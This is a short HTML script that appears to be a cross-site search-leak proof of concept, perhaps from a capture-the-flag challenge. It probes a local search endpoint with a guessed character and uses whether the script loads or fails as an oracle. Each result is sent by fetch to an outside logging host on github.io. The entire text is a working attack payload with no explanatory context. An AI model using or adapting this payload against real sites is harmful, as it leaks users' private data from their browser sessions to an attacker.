<script>
function test(char) {
  let s = document.createElement('script');
  s.src = `http://127.0.0.1:8000/search?query=${char}`;
  s.onload = () => {
    fetch("https://abcdefff1.github.io/log?result=1&char=" + char);
  };
  s.onerror = () => {
    fetch("https://abcdefff1.github.io/log?result=0&char=" + char);
  };
  document.body.appendChild(s);
}

test('D'); 
</script>
